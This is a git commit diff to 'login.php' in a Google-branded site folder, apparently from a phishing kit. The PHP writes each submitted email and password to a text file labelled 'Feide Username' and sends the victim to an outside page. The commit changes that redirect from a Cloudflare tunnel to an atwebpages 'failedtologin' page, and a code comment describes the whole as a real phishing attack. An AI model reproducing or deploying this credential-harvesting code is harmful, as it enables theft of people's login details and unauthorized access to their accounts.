648d9fb46366ab408422c783a8e7013390a6c366
Hmmmmmmmmmmmhm <100936112+Hmmmmmmmmmmmhm@users.noreply.github.com>
2025-04-08 14:02:15 +0200

    login.php

--- .sites/google/login.php
+++ .sites/google/login.php
@@ -7,6 +7,6 @@ $password = $_POST['password'];
 file_put_contents("usernames.txt", "Feide Username: " . htmlspecialchars($email) . " Pass: " . htmlspecialchars($password) . "\n", FILE_APPEND);
 
 // Redirect the user to a different page to simulate a real phishing attack
-header('Location: https://balloon-domain-camps-cheats.trycloudflare.com');
+header('Location: http://heinejordmor.atwebpages.com/failedtologin.html');
 exit();
 ?>
